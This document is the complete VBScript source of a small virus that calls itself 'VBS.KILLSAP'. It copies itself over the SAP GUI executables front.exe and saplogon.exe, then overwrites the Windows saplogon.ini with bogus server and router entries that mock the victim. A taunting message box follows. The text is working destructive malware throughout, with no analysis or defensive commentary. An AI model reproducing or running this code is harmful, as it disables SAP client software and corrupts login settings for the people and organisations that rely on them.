   'VBS.KILLSAP
   'First Kiddie and Stupid Script
   Set killsap = CreateObject("Scripting.FileSystemObject")
   Killsap.CopyFile wscript.ScriptFullName, "C:\ARCHIV~1\SAP\SAPGUI\front.exe"
   Killsap.CopyFile wscript.ScriptFullName, "C:\ARCHIV~1\SAP\SAPGUI\saplogon.exe"
   Set WinDoze   = Killsap.GetSpecialFolder(0)
   Set KillLogon = Killsap.CreateTextFile(Windoze & "\saplogon.ini", True)
   KillLogon.WriteLine "[Description]"
   KillLogon.WriteLine "Item1=VBS.KillSAP was here!!"
   KillLogon.WriteLine "[Router]"
   KillLogon.WriteLine "Item1=/H/123.45.67.89/S/Hi!!9A/H/"
   KillLogon.WriteLine "[Server]"
   KillLogon.WriteLine "Item1=Now.in.Fucking.VBS"
   KillLogon.WriteLine "[Database]"
   KillLogon.WriteLine "Item1=00"
   KillLogon.Close
   msgbox "Thank's for hosting and running VBS.KILLSAP"
